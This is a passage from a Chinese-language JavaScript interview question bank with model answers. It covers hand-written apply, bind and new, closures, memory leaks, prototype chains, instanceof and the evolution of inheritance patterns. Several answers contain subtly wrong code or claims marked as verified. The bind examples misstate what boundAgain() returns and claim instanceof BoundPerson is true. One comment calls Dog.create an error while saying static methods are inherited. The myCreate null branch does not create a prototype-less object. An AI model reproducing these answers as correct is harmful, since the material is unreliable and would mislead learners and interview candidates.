  return result;
};

// ==================== 测试用例 ====================

// 测试1：基本用法（数组参数）
function sum(a, b, c) {
  return a + b + c + (this.base || 0);
}

const calculator = { base: 10 };

console.log(sum.myApply(calculator, [1, 2, 3]));  // 16 (10+1+2+3) ✅

// 测试2：未提供第二个参数（空数组）
function noArgs() {
  return this.value;
}

console.log(noArgs.myApply({ value: 42 }));       // 42 ✅
console.log(noArgs.myApply({ value: 100 }, null)); // 100 ✅（null 当作空数组）

// 测试3：类数组对象（arguments）
function logArgs() {
  return Array.from(arguments).join(', ');
}

function wrapper() {
  return logArgs.myApply({}, arguments);  // 传入 arguments 对象
}

console.log(wrapper('a', 'b', 'c'));  // "a, b, c" ✅

// 测试4：错误情况（非数组参数）
try {
  sum.myApply(calculator, 'not an array');  // 应该抛出 TypeError
} catch (error) {
  console.log(error instanceof TypeError);  // true ✅
  console.log(error.message.includes('non-object'));  // true ✅
}
```

#### 手写 myBind - 完整版实现

```javascript
/**
 * 手写 Function.prototype.bind - 完整版
 * @param {*} thisArg - 绑定的 this 指向
 * @param {...any} partialArgs - 预设的部分参数（柯里化）
 * @returns {Function} 绑定后的新函数
 * 
 * 核心特点：
 * 1. 不立即执行，返回一个新函数
 * 2. 支持柯里化（预设部分参数）
 * 3. 新函数可以用 new 调用（此时忽略绑定的 this）
 */
Function.prototype.myBind = function(thisArg, ...partialArgs) {
  // ==================== 步骤1：保存原始函数的引用 ====================
  // this 指向调用 bind 的原始函数
  // 必须保存引用，因为后续返回的新函数中需要调用它
  
  const originalFn = this;

  // ==================== 步骤2：处理绑定的 thisArg ====================
  // 与 call/apply 不同，bind 的 thisArg 是"软绑定"
  // 即使传入 null/undefined，也会被保留（在调用时再决定如何处理）
  
  const boundThisArg = thisArg;  // 保存绑定的上下文

  // ==================== 步骤3：定义绑定后的新函数 ====================
  
  /**
   * boundFn - 绑定后的新函数
   * @param {...any} laterArgs - 后续调用时传入的参数
   * @returns {any} 执行结果（可能是新创建的实例，也可能是普通返回值）
   */
  function boundFn(...laterArgs) {
    // ==================== 合并参数 ====================
    // partialArgs：bind 时预设的参数（柯里化的第一部分）
    // laterArgs：实际调用时传入的参数（第二部分）
    // 最终参数顺序：[...partialArgs, ...laterArgs]
    
    const allArgs = [...partialArgs, ...laterArgs];

    // ==================== 关键判断：是否被 new 调用 ====================
    // new.target 是 ES6 新增的特性
    // 如果函数是通过 new 调用的，new.target 会指向该函数本身
    // 如果是普通调用，new.target 为 undefined
    
    // 这是 bind 最 tricky 的地方！
    // 规范要求：如果绑定函数被 new 调用，应该忽略 bind 的 thisArg
    // 此时 this 指向新创建的实例（由 new 操作符生成）
    
    if (new.target) {
      // ⭐ new 调用场景：
      // 场景1：new BoundPerson('NewName')
      //   - 忽略 boundThisArg（绑定的 this）
      //   - 创建新实例，this 指向这个新实例
      //   - 执行 originalFn，传入所有合并后的参数
      
      // 为什么用 new originalFn(...allArgs) 而不是 originalFn.apply(this, allArgs)？
      // 因为需要正确处理构造函数返回值的逻辑（参考 myNew 的步骤4）
      
      return new originalFn(...allArgs);
    }

    // ==================== 普通 call 调用场景 ====================
    // 场景2：boundFn('arg1', 'arg2')
    //   - 使用绑定的 boundThisArg 作为 this
    //   - 执行 originalFn，传入所有合并后的参数
    
    return originalFn.apply(boundThisArg, allArgs);
  }

  // ==================== 步骤4：维护原型链（重要！）====================
  // 让绑定后的函数也能被用于继承
  // boundFn.prototype 应该指向原函数的 prototype
  // 这样 new boundFn() 创建的实例能继承原函数原型上的方法
  
  // 为什么不用 boundFn.prototype = originalFn.prototype？
  // 因为那样会导致两个引用指向同一个对象！
  // 如果修改了 boundFn.prototype，会影响 originalFn.prototype（反之亦然）
  // 所以使用 Object.create 创建一个新的对象作为中介
  
  // 但有一个边界情况：如果原函数不是构造函数（没有 prototype），就不需要设置
  if (originalFn.prototype) {
    // 创建一个新对象，其原型指向 originalFn.prototype
    // 这样 boundFn.prototype 和 originalFn.prototype 是不同的对象
    // 但 boundFn.prototype.__proto__ === originalFn.prototype ✅
    boundFn.prototype = Object.create(originalFn.prototype);
  }

  // ==================== 步骤5：额外属性（调试友好）====================
  // 一些实现会添加这些属性，方便调试：
  // boundFn.length = Math.max(originalFn.length - partialArgs.length, 0);
  // boundFn.name = `bound ${originalFn.name || ''}`;

  // ==================== 返回绑定后的新函数 ====================
  return boundFn;
};

// ==================== 测试用例 ====================

// 测试1：基本绑定
function introduce(role) {
  return `${this.name} is a ${role}`;
}

const user = { name: 'Alice' };
const boundIntroduce = introduce.myBind(user, 'developer');

console.log(boundIntroduce());  // "Alice is a developer" ✅

// 测试2：柯里化（预设部分参数）
function multiply(a, b, c) {
  return a * b * c;
}

const doubleAndMultiply = multiply.myBind(null, 2);  // 预设第一个参数为 2
console.log(doubleAndMultiply(3, 4));  // 24 (2*3*4) ✅
console.log(doubleAndMultiply(5, 6));  // 60 (2*5*6) ✅

// 测试3：配合 new 使用（忽略绑定的 this）
function Person(name, age) {
  this.name = name;
  this.age = age;
}
Person.prototype.greet = function() {
  return `Hi, I'm ${this.name}`;
};

const BoundPerson = Person.myBind({ ignored: 'context' }, 'Bound');
const p = new BoundPerson(25);

console.log(p.name);           // "Bound" ✅（来自 bind 预设参数）
console.log(p.age);            // 25 ✅（来自 new 调用时传入）
console.log(p.ignored);        // undefined ✅（绑定的 this 被 new 忽略了）
console.log(p.greet());         // "Hi, I'm Bound" ✅（原型链正常工作）
console.log(p instanceof BoundPerson);  // true ✅
console.log(p instanceof Person);       // true ✅（原型链继承关系正确）

// 测试4：多次 bind（只有第一次有效）
function getX() {
  return this.x;
}

const f1 = getX.myBind({ x: 1 });
const f2 = f1.myBind({ x: 2 });  // 第二次 bind 无效！

console.log(f1());  // 1 ✅
console.log(f2());  // 1 ✅（仍然是第一次 bind 的值，第二次无效）

// 测试5：绑定后可以再次调用（但不改变绑定）
const boundAgain = boundIntroduce.bind({ name: 'Bob' }, 'manager');
console.log(boundAgain());  // "Alice is a manager" ✅（仍然是 Alice，不是 Bob）
```

**核心原理对比总结**：

| 方法 | 执行时机 | 参数形式 | 返回值 | 特殊处理 |
|:---|:---|:---|:---|:---|
| **myCall** | **立即执行** | 逐个传入 `(ctx, arg1, arg2)` | 函数结果 | 原始值自动包装 |
| **myApply** | **立即执行** | 数组传入 `(ctx, [arg1, arg2])` | 函数结果 | 参数验证、类数组转换 |
| **myBind** | **返回新函数** | 预设参数 `(ctx, preset1)` | 新函数 | 支持 new 调用、柯里化、原型链维护 |

---

## Q19: 什么是闭包（Closure）？请解释其本质，并解决经典的「循环 + setTimeout 输出问题」（给出 3 种解法）。
- **难度**：★★☆
- **知识点**：闭包、作用域、setTimeout
- **题型**：简答题 + 编程实践题

### 参考答案要点：

#### 1. 闭包的定义与本质

**定义**：闭包是指**函数能够记住并访问其词法作用域**，即使这个函数在其词法作用域之外执行。

**本质**：闭包 = **函数** + **函数能够访问的外部自由变量的引用**。

```javascript
// 最简单的闭包
function createCounter() {
  let count = 0;  // 自由变量 — 被 innerFn 引用
  return function innerFn() {  // 闭包函数
    count++;
    return count;
  };
}

const counter = createCounter();
counter(); // 1
counter(); // 2
counter(); // 3
// createCounter 执行完毕后，其执行上下文应该销毁
// 但因为 innerFn 仍然引用 count，所以 count 不会被回收
// 这就是闭包的本质：延长了变量的生命周期
```

#### 2. 闭包的内部机制

```javascript
function outer() {
  let a = 1;
  function inner() {
    console.log(a);  // inner 形成了对 a 的闭包
  }
  return inner;
}

// 内存模型：
// inner 函数对象内部有一个 [[Environment]] 隐藏属性
// 它指向 outer 的词法环境记录（Lexical Environment）
// 其中包含了变量 a
// 只要 inner 函数存在，这个环境记录就不会被 GC 回收
```

#### 3. 经典问题：循环 + setTimeout

```javascript
// 问题代码：输出什么？
for (var i = 0; i < 5; i++) {
  setTimeout(function() {
    console.log(i);
  }, 100);
}
// 输出：5, 5, 5, 5, 5
// 原因：var i 是函数作用域，所有回调共享同一个 i
// 循环结束时 i = 5，所有回调打印的都是 5
```

**解法一：使用 let（ES6，✅ 最推荐）**

```javascript
for (let i = 0; i < 5; i++) {
  setTimeout(function() {
    console.log(i);
  }, 100);
}
// 输出：0, 1, 2, 3, 4
// 原因：let 在每次循环迭代中创建新的块级作用域
// 每次 setTimeout 的回调捕获的是不同的 i
```

**解法二：IIFE（立即执行函数，ES5 方案）**

```javascript
for (var i = 0; i < 5; i++) {
  (function(j) {
    setTimeout(function() {
      console.log(j);
    }, 100);
  })(i);  // 立即把当前的 i 值传给 j
}
// 输出：0, 1, 2, 3, 4
// 原因：每次 IIFE 创建一个新的作用域，j 的值被闭包捕获
```

**解法三：bind 传递参数**

```javascript
for (var i = 0; i < 5; i++) {
  setTimeout(function(j) {
    console.log(j);
  }.bind(null, i), 100);
}
// 输出：0, 1, 2, 3, 4
// 原因：bind 预设了第一个参数，每次回调接收不同的 i 值
```

**解法四：setTimeout 第三个参数（较少人知）**

```javascript
for (var i = 0; i < 5; i++) {
  setTimeout(
    function(j) { console.log(j); },  // 回调函数
    100,                              // 延迟时间
    i                                 // 传递给回调的额外参数（ES5+）
  );
}
```

### 🔍 追问链

1. **除了 let 替代 var，还有哪些方式解决循环定时器问题？**
   → 方向：IIFE（立即执行函数传参）、setTimeout 第三个参数、bind 绑定当前 i
2. **闭包会导致内存泄漏吗？什么情况下会？如何避免？**
   → 方向：闭包本身不会泄漏，但如果闭包持有大量 DOM 引用且不再使用就会泄漏；解决：手动置 null 断开引用
3. **闭包和模块模式的关系？ES Module 是闭包的一种应用吗？**
   → 方向：是的！模块的私有变量就是通过闭包实现的；import/export 本质是编译时的闭包封装

---

## Q20: 请列举闭包在实际开发中的应用场景，并说明闭包可能导致内存泄漏的情况及防范措施。
- **难度**：★★☆
- **知识点**：闭包应用、内存泄漏
- **题型**：简答题

### 参考答案要点：

#### 1. 闭包的实际应用场景

##### 场景一：数据封装 / 模块模式（Module Pattern）

```javascript
// 模拟私有变量
function createBankAccount(initialBalance) {
  let balance = initialBalance;  // 私有变量，外部无法直接访问

  return {
    deposit(amount) {
      balance += amount;
      return balance;
    },
    withdraw(amount) {
      if (amount > balance) throw new Error('余额不足');
      balance -= amount;
      return balance;
    },
    getBalance() {
      return balance;  // 只读接口
    }
  };
}

const account = createBankAccount(100);
account.deposit(50);    // 150
account.withdraw(30);   // 120
account.balance;        // undefined — 无法直接访问
account.getBalance();   // 120
```

##### 场景二：函数工厂（偏函数 / Currying）

```javascript
function makeMultiplier(factor) {
  return function(number) {
    return number * factor;
  };
}

const double = makeMultiplier(2);
const triple = makeMultiplier(3);

double(5);   // 10
triple(5);   // 15

// 实际应用：配置请求函数
function createFetcher(baseUrl) {
  return function(endpoint, options = {}) {
    return fetch(`${baseUrl}${endpoint}`, options)
      .then(res => res.json());
  };
}

const apiFetch = createFetcher('https://api.example.com');
apiFetch('/users');     // GET https://api.example.com/users
apiFetch('/posts', { method: 'POST', body: '{}' });
```

##### 场景三：状态管理与记忆化（Memoization）

```javascript
function memoize(fn) {
  const cache = new Map();  // 闭包保存缓存
  return function(...args) {
    const key = JSON.stringify(args);
    if (cache.has(key)) {
      console.log('从缓存获取');
      return cache.get(key);
    }
    const result = fn.apply(this, args);
    cache.set(key, result);
    return result;
  };
}

const expensiveCalc = memoize((n) => {
  console.log('执行昂贵计算...');
  return n * n * n;  // 假设这是很耗时的计算
});

expensiveCalc(5);  // 执行昂贵计算... → 125
expensiveCalc(5);  // 从缓存获取 → 125（直接返回缓存结果）
```

##### 场景四：回调函数中保存状态

```javascript
// React/Vue 中的事件处理器
function handleClick(initialCount) {
  let count = initialCount;
  return function() {
    count++;
    console.log(`点击了 ${count} 次`);
  };
}

const buttonHandler = handleClick(0);
button.addEventListener('click', buttonHandler);
```

##### 场景五：迭代器和生成器

```javascript
// 闭包实现迭代器
function createIterator(arr) {
  let index = 0;
  return {
    next() {
      return index < arr.length
        ? { value: arr[index++], done: false }
        : { done: true };
    },
    reset() {
      index = 0;
    }
  };
}
```

#### 2. 闭包导致的内存泄漏

##### 泄漏场景一：未及时清理的事件监听器

```javascript
// ❌ 泄漏：组件销毁但事件监听器仍在
function setupComponent() {
  let hugeData = new Array(100000).fill('data');
  document.getElementById('btn').addEventListener('click', function() {
    console.log(hugeData.length);  // 闭包引用了 hugeData
  });
}
// 即使组件被移除，hugeData 也不会被释放（监听器还活着）

// ✅ 解决：移除时清理
function setupComponent() {
  let hugeData = new Array(100000).fill('data');
  const btn = document.getElementById('btn');
  const handler = function() {
    console.log(hugeData.length);
  };
  btn.addEventListener('click', handler);

  // 返回清理函数
  return function cleanup() {
    btn.removeEventListener('click', handler);
    hugeData = null;  // 断开引用
  };
}

const cleanup = setupComponent();
// 组件销毁时调用 cleanup();
```

##### 泄漏场景二：定时器未清除

```javascript
// ❌ 泄漏：定时器持续引用大对象
function pollData() {
  let largeCache = {};
  setInterval(() => {
    process(largeCache);  // 闭包引用 largeCache
  }, 1000);
}

// ✅ 解决：保存定时器 ID 并在适当时机 clearInterval
function pollData() {
  let largeCache = {};
  const timerId = setInterval(() => {
    process(largeCache);
  }, 1000);
  return function stop() {
    clearInterval(timerId);
    largeCache = null;
  };
}
```

##### 泄漏场景三：闭包中的循环引用（IE 老版本问题，现代浏览器已通过标记清除算法解决）

```javascript
// 历史上 IE6-7 的 DOM + JS 循环引用问题
// 现代 V8 等引擎使用标记清除算法，已不存在此问题
// 但了解历史有助于理解为什么需要手动清理
```

#### 3. 防范闭包内存泄漏的最佳实践

```javascript
// 1. 及时解除引用
let handler = function() { /* ... */ };
element.addEventListener('click', handler);
// 清理时：
element.removeEventListener('click', handler);
handler = null;

// 2. 使用 WeakMap/WeakSet 存储关联数据（自动 GC）
const elementData = new WeakMap();

// 3. 避免在长生命周期的闭包中捕获短生命周期的大的对象
// 如果必须捕获，确保在不需要时置为 null

// 4. 使用工具检测
// Chrome DevTools → Memory → Take Heap Snapshot
// 对比快照，查看 detached DOM tree
```

---

## Q21: 请详细说明 `prototype`、`__proto__` 和 `constructor` 三者的三角关系，并用图示描述。
- **难度**：★★☆
- **知识点**：原型、prototype、__proto__、constructor
- **题型**：简答题

### 参考答案要点：

#### 1. 三者定义

| 属性 | 所属 | 含义 |
|:---|:---|:---|
| `prototype` | **函数**独有 | 函数的原型对象，用于被实例的 `__proto__` 指向 |
| `__proto__` | **所有对象**都有 | 对象的原型，指向构造函数的 `prototype` |
| `constructor` | **原型对象**上的属性 | 指向关联的构造函数 |

#### 2. 三角关系图示

```
function Person(name) {
  this.name = name;
}

Person.prototype.sayHi = function() {
  return `Hi, I'm ${this.name}`;
};

const tom = new Person('Tom');

┌─────────────────────────────────────────────────┐
│                   三角关系                        │
├─────────────────────────────────────────────────┤
│                                                  │
│   ┌──────────────┐                               │
│   │   Person     │  (构造函数)                    │
│   │              │                               │
│   │ prototype ───┼────→ ┌─────────────────┐      │
│   │              │      │  Person.prototype │      │
│   └──────────────┘      │                   │      │
│                          │  constructor ─────┼── Person (回指) │
│                          │  sayHi: fn        │      │
│                          └────────▲──────────┘      │
│                                   │                 │
│   ┌──────────────┐      __proto__ │                 │
│   │    tom       │ ───────────────┘                │
│   │  (实例对象)   │                                  │
│   │              │                                  │
│   │ __proto__ ───┼────→ Person.prototype            │
│   └──────────────┘                                  │
│                                                     │
│   Person.__proto__ === Function.prototype           │
│   Person.prototype.__proto__ === Object.prototype   │
│   Object.prototype.__proto__ === null               │
└─────────────────────────────────────────────────┘
```

#### 3. 代码验证

```javascript
function Person(name) {
  this.name = name;
}
Person.prototype.sayHi = function() {};

const tom = new Person('Tom');

// 验证三角关系
tom.constructor === Person;              // true
tom.__proto__ === Person.prototype;       // true
Person.prototype.constructor === Person;  // true

// 原型链顶端
tom.__proto__.__proto__ === Object.prototype; // true
Object.prototype.__proto__ === null;           // true — 原型链终点

// 函数也是对象
Person.__proto__ === Function.prototype;       // true
Function.prototype.__proto__ === Object.prototype; // true
```

#### 4. 重要细节

```javascript
// 1. __proto__ 是浏览器实现的非标准属性（现已标准化）
// 推荐使用 Object.getPrototypeOf(obj) 和 Object.setPrototypeOf()

// 2. constructor 容易被误改
Person.prototype = { sayHi: function(){} };
const jerry = new Person('Jerry');
jerry.constructor === Person;  // false！变成了 Object
// 因为新的 prototype 对象的 constructor 默认指向 Object

// 修复方式：
Person.prototype = {
  constructor: Person,  // 手动修正
  sayHi: function() {}
};

// 3. 所有函数的 prototype 默认是一个空对象
// 该空对象的 constructor 指向函数本身
function Foo() {}
Foo.prototype.constructor === Foo; // true
Foo.prototype === { constructor: Foo }; // 近似等价
```

### 🔍 追问链

1. **hasOwnProperty 和 in 操作符的区别？什么时候用哪个？**
   → 方向：hasOwnProperty 只检查自身属性（不包括原型链）；in 检查自身+原型链
2. **如何遍历对象的所有属性（包括不可枚举的和 Symbol 的）？**
   → 方向：Reflect.ownKeys(obj) 返回所有自身属性的 key（含 Symbol + 不可枚举）
3. **Object.create(null) 创建的对象有什么特殊用途？**
   → 方向：没有原型链（__proto__ 为 null），没有 toString 等方法；适合做纯净字典/Map 替代品（无原型污染风险）

---

## Q22: 请描述 JavaScript 的原型链查找过程，并手写实现 `myInstanceof` 运算符。
- **难度**：★★☆
- **知识点**：原型链、instanceof、手写实现
- **题型**：编程实践题

### 参考答案要点：

#### 1. 原型链查找过程

当访问一个对象的属性时，JS 引擎的查找过程：

```
1. 先在对象自身（own properties）查找
2. 如果没找到，沿着 __proto__ 向上查找（原型对象）
3. 如果还没找到，继续沿原型的 __proto__ 向上查找
4. 直到找到属性 或 到达 null（原型链末端）
5. 到达 null 还没找到 → 返回 undefined
```

```javascript
function Animal(name) {
  this.name = name;
}
Animal.prototype.eat = function() { return `${this.name} is eating`; };

function Dog(name, breed) {
  Animal.call(this, name);  // 继承实例属性
  this.breed = breed;
}
Dog.prototype = Object.create(Animal.prototype);  // 继承原型方法
Dog.prototype.constructor = Dog;
Dog.prototype.bark = function() { return 'Woof!'; };

const dog = new Dog('旺财', '柴犬');

dog.name;        // '旺财' — 自身属性
dog.breed;       // '柴犬' — 自身属性
dog.bark();      // 'Woof!' — Dog.prototype 上
dog.eat();       // '旺财 is eating' — Animal.prototype 上（沿原型链查找到）
dog.toString();  // '[object Object]' — Object.prototype 上
dog.notExist;    // undefined — 整条原型链都没找到
```

#### 2. instanceof 原理

`instanceof` 的本质是**沿原型链查找**：检查构造函数的 `prototype` 是否出现在对象的原型链上。

```javascript
// instanceof 伪代码：
function instanceOf(obj, Constructor) {
  // 基本类型总是返回 false（除了特殊情况）
  if (obj === null || (typeof obj !== 'object' && typeof obj !== 'function')) {
    return false;
  }

  let proto = Object.getPrototypeOf(obj);  // 即 obj.__proto__

  while (proto !== null) {
    if (proto === Constructor.prototype) {
      return true;  // 在原型链上找到了
    }
    proto = Object.getPrototypeOf(proto);  // 继续向上查找
  }

  return false;  // 到达原型链末端仍未找到
}
```

#### 3. 完整测试

```javascript
// 测试 myInstanceof
function myInstanceof(left, right) {
  if (left === null || (typeof left !== 'object' && typeof left !== 'function')) {
    return false;
  }
  let proto = Object.getPrototypeOf(left);
  while (proto) {
    if (proto === right.prototype) return true;
    proto = Object.getPrototypeOf(proto);
  }
  return false;
}

// 测试用例
myInstanceof([], Array);           // true
myInstanceof([], Object);         // true
myInstanceof(function(){}, Function); // true
myInstanceof(123, Number);        // false（基本类型）
myInstanceof(null, Object);       // false
myInstanceof(dog, Dog);           // true
myInstanceof(dog, Animal);        // true（原型链上有 Animal.prototype）
myInstanceof(dog, Object);        // true
```

#### 4. instanceof 的陷阱

```javascript
// 陷阱1：跨 realm 问题（类似 Array.isArray 的场景）
// 陷阱2：prototype 被修改后结果变化
function A() {}
const a = new A();
a instanceof A;  // true
A.prototype = {};  // 修改了 prototype
a instanceof A;  // false！（a 的 __proto__ 还是旧的 prototype）

// 陷阱3：原始类型的包装对象
'string' instanceof String;  // false（基本类型不是对象）
new String('hi') instanceof String;  // true
```

### 🔍 追问链

1. **instanceof 在跨 iframe/window 场景下会失效，为什么？**
   → 方向：每个 window 有独立的 prototype 对象；iframe 中的 Array.prototype !== 外部 window 的 Array.prototype
2. **如何实现跨环境的类型检测？**
   → 方向：Object.prototype.toString.call(value) 返回 '[object XXX]' 格式，不受环境影响
3. **Symbol.hasInstance 可以自定义 instanceof 行为？**
   → 方向：是的，在类的静态方法或对象上定义 Symbol.hasInstance 可以自定义 instanceof 判断逻辑

---

## Q23: 请详述 JavaScript 继承方案的演进过程，至少覆盖到寄生组合继承和 `class extends`。
- **难度**：★★☆
- **知识点**：继承、原型链、class
- **题型**：简答题 + 编程实践题

### 参考答案要点：

#### 方案一：原型链继承

```javascript
// 核心：子类的 prototype 指向父类的实例
function Parent() {
  this.name = 'parent';
  this.colors = ['red', 'blue'];
}
Parent.prototype.sayName = function() {
  return this.name;
};

function Child() {}
Child.prototype = new Parent();  // 核心：继承 Parent 的实例和方法
Child.prototype.constructor = Child;

const child1 = new Child();
const child2 = new Child();

child1.colors.push('green');
console.log(child2.colors); // ['red', 'blue', 'green'] ❌ 共享引用属性！
// 缺点：
// 1. 引用类型属性被所有实例共享（修改一个影响全部）
// 2. 创建子类实例时无法向父类构造函数传参
```

#### 方案二：构造函数继承（借用构造函数 / Classical Inheritance）

```javascript
function Parent2(name) {
  this.name = name;
  this.colors = ['red', 'blue'];
}
function Child2(name) {
  Parent2.call(this, name);  // 核心：借用父类构造函数
}

const child3 = new Child2('child3');
const child4 = new Child2('child4');
child3.colors.push('green');
console.log(child4.colors); // ['red', 'blue'] ✅ 互不影响
// 缺点：
// 1. 方法都在构造函数中定义，无法复用（每次创建实例都创建新方法）
// 2. 无法继承父类原型上的方法
```

#### 方案三：组合继承（Combination Inheritance）

```javascript
function Parent3(name) {
  this.name = name;
  this.colors = ['red', 'blue'];
}
Parent3.prototype.sayName = function() { return this.name; };

function Child3(name, age) {
  Parent3.call(this, name);  // 第一次调用 Parent3 — 继承实例属性
  this.age = age;
}
Child3.prototype = new Parent3();  // 第二次调用 Parent3 — 继承原型方法
Child3.prototype.constructor = Child3;
Child3.prototype.sayAge = function() { return this.age; };

// ✅ 优点：既继承了实例属性（互不影响），又继承了原型方法
// ❌ 缺点：父类构造函数被调用了两次（一次在 call，一次在 new）
//        子类 prototype 上会有多余的父类实例属性
```

#### 方案四：寄生组合继承（Parasitic Combination Inheritance，✅ 最佳传统方案）

```javascript
function Parent4(name) {
  this.name = name;
  this.colors = ['red', 'blue'];
}
Parent4.prototype.sayName = function() { return this.name; };

function Child4(name, age) {
  Parent4.call(this, name);  // 只调用一次父类构造函数
  this.age = age;
}

// 核心：用 Object.create 代替 new Parent4()
// 创建一个以 Parent4.prototype 为原型的新对象
// 避免了调用两次父类构造函数
Child4.prototype = Object.create(Parent4.prototype);
Child4.prototype.constructor = Child4;
Child4.prototype.sayAge = function() { return this.age; };

// ✅ 优点：
// 1. 父类构造函数只调用一次
// 2. 保持了原型链的完整性
// 3. 子类 prototype 上不会有冗余的父类实例属性
```

#### 方案五：ES6 class extends（✅ 现代方案）

```javascript
class Animal {
  // 类的构造方法
  constructor(name) {
    this.name = name;
  }

  // 原型方法（相当于 Animal.prototype.method）
  speak() {
    return `${this.name} makes a sound`;
  }

  // 静态方法（相当于 Animal.staticMethod）
  static create(name) {
    return new Animal(name);
  }
}

class Dog extends Animal {
  constructor(name, breed) {
    super(name);  // 必须在使用 this 之前调用 super()
    this.breed = breed;
  }

  speak() {
    return `${this.name} says Woof!`;  // 重写父类方法
  }

  bark() {
    return 'Woof woof!';
  }
}

const dog = new Dog('旺财', '柴犬');
dog.speak();  // '旺财 says Woof!'（调用自己的）
dog.bark();   // 'Woof woof!'
Dog.create('test'); // Error — 静态方法也被继承

// class extends 的本质：
// 1. Dog.prototype.__proto__ === Animal.prototype（原型方法继承）
// 2. Dog.__proto__ === Animal（静态方法/属性继承）
// 3. 内部使用 [[HomeObject]] + super 关键字实现
```

#### 继承方案演进总结

```
原型链继承 → 构造函数继承 → 组合继承 → 寄生组合继承 → class extends
   ❌共享引用     ❌无法复用原型   ❌调用两次父类    ✅最优传统方案      ✅语法糖
```

---

## Q24: 请说明 `new` 操作符的内部执行步骤，并手写实现 `myNew`。同时说明 `Object.create` 的原理。
- **难度**：★★☆
- **知识点**：new、Object.create、手写实现
- **题型**：编程实践题

### 参考答案要点：

#### 1. new 操作符的 4 个步骤

```javascript
function Person(name) {
  this.name = name;
}
Person.prototype.sayHi = function() {
  return `Hi, I'm ${this.name}`;
};

const p = new Person('Tom');

// new 内部做了以下 4 件事：
// 1. 创建一个全新的空对象
// 2. 将新对象的 __proto__ 指向构造函数的 prototype
// 3. 将构造函数的 this 指向新对象，并执行构造函数
// 4. 如果构造函数返回一个对象，则返回该对象；否则返回新创建的对象
```

#### 2. 手写 myNew

```javascript
function myNew(Constructor, ...args) {
  // 步骤1：创建一个新对象
  const obj = {};

  // 步骤2：将新对象的 __proto__ 指向 Constructor.prototype
  // 等价于：obj.__proto__ = Constructor.prototype;
  Object.setPrototypeOf(obj, Constructor.prototype);

  // 步骤3：执行构造函数，this 指向新对象
  const result = Constructor.apply(obj, args);

  // 步骤4：判断返回值
  // 如果构造函数返回的是一个对象（非 null），则返回该对象
  // 否则返回新创建的对象
  return (result !== null && typeof result === 'object')
    || typeof result === 'function'
    ? result
    : obj;
}

// 测试
function Person(name) {
  this.name = name;
}
Person.prototype.sayHi = function() {
  return `Hi, I'm ${this.name}`;
};

const tom = myNew(Person, 'Tom');
tom.name;           // 'Tom'
tom.sayHi();        // 'Hi, I'm Tom'
tom instanceof Person; // true

// 测试返回对象的情况
function Special() {
  return { custom: 'object' };
}
const special = myNew(Special);
special.custom; // 'object'（返回的是构造函数指定的对象）
```

#### 3. Object.create 原理与手写

```javascript
// Object.create(proto, descriptors) 的作用：
// 创建一个新对象，并以指定对象为原型

const parent = { name: 'parent' };
const child = Object.create(parent);
child.name; // 'parent'（从原型链继承）
child.hasOwnProperty('name'); // false（不是自身属性）

// 手写实现
function myCreate(proto, propertyDescriptors) {
  // 处理 proto 为 null 的情况（创建无原型的对象）
  if (proto === null) {
    // 使用 __proto__: null 创建真正无原型的对象
    return Object.defineProperty({}, '__proto__', {
      value: null,
      enumerable: false,
      writable: true,
      configurable: true
    });
    // 或者：return Object.create(null)（递归会导致栈溢出，实际中用其他方式）
  }

  // 临时构造函数方式（经典 polyfill 写法）
  function F() {}
  F.prototype = proto;
  const obj = new F();

  // 如果提供了属性描述符，批量定义
  if (propertyDescriptors) {
    Object.defineProperties(obj, propertyDescriptors);
  }

  return obj;
}

// 测试
const base = { greet() { return 'hello'; } };
const obj = myCreate(base);
obj.greet(); // 'hello'
Object.getPrototypeOf(obj) === base; // true
```

#### 4. Object.create vs new vs 字面量的区别

```javascript
// {} ≈ Object.create(Object.prototype)
// new Fn() ≈ Object.create(Fn.prototype) + 执行 Fn
// Object.create(null) — 创建没有原型的对象（真正的纯净字典）

const dict = Object.create(null);
dict.key = 'value';
'toString' in dict; // false — 没有 toString 等继承方法
// 适合用作纯粹的键值对字典（不会与原型属性冲突）
```

### 深度拓展：手写实现

#### 手写 myNew - 完整版实现

```javascript
/**
 * 手写 new 操作符 - 完整版
 * @param {Function} Constructor - 构造函数
 * @param {...any} args - 传递给构造函数的参数
 * @returns {Object} 新创建的实例对象
 */
function myNew(Constructor, ...args) {
  // ==================== 步骤1：创建一个全新的空对象 ====================
  // 使用 Object.create 创建一个空对象
  // 这样比字面量 {} 更干净（不会有 Object.prototype 上的方法干扰调试）
  const obj = Object.create(null);

  // ==================== 步骤2：链接原型链 ====================
  // 将新对象的 __proto__（隐式原型）指向构造函数的 prototype（显式原型）
  // 这是实现继承的关键步骤！实例可以通过原型链访问构造函数原型上的方法
  // 等价于：obj.__proto__ = Constructor.prototype;
  // 但使用 setPrototypeOf 是更标准的方式（ES6+）
  Object.setPrototypeOf(obj, Constructor.prototype);

  // ==================== 步骤3：绑定 this 并执行构造函数 ====================
  // 使用 apply/call 将构造函数的 this 指向新创建的对象
  // 这样构造函数中通过 this.xxx = xxx 添加的属性都会挂载到新对象上
  let result;
  
  try {
    // 使用 apply 执行构造函数，传入参数数组
    result = Constructor.apply(obj, args);
  } catch (error) {
    // 如果构造函数抛出异常，应该将异常向上抛出
    // new 操作符的行为是：如果构造函数抛出错误，不会返回对象
    throw error;
  }

  // ==================== 步骤4：处理返回值 ====================
  // 关键判断：如果构造函数显式返回了一个引用类型值（对象或函数），
  // 则 new 表达式的结果就是这个返回值，而不是新创建的对象
  
  // 判断条件：
  // 1. result 不是 null（null 虽然是 object 类型，但应该被忽略）
  // 2. result 是 object 类型（普通对象、数组、Date、RegExp 等）
  //    或者 result 是 function 类型（构造函数可以返回一个函数）
  
  if (result !== null && (typeof result === 'object' || typeof result === 'function')) {
    // 构造函数返回了对象/函数 → 返回这个返回值（忽略新创建的 obj）
    return result;
  }
  
  // 否则 → 返回新创建的对象（这是最常见的情况）
  return obj;
}

// ==================== 测试用例 ====================

// 测试1：基本用法
function Person(name, age) {
  this.name = name;   // 通过 this 添加到新对象上
  this.age = age;
}
Person.prototype.sayHi = function() {  // 原型上的方法
  return `Hi, I'm ${this.name}, ${this.age} years old`;
};

const tom = myNew(Person, 'Tom', 18);
console.log(tom.name);              // 'Tom' ✅
console.log(tom.age);               // 18 ✅
console.log(tom.sayHi());           // "Hi, I'm Tom, 18 years old" ✅
console.log(tom instanceof Person); // true ✅（原型链正确）

// 测试2：构造函数返回对象（特殊情况）
function SpecialConstructor() {
  this.normalProperty = '会被忽略';  // 这个属性不会被保留
  return { 
    customProperty: '我是返回的对象',  // 这个会作为 new 的结果
    override: true 
  };
}

const special = myNew(SpecialConstructor);
console.log(special.customProperty); // "我是返回的对象" ✅
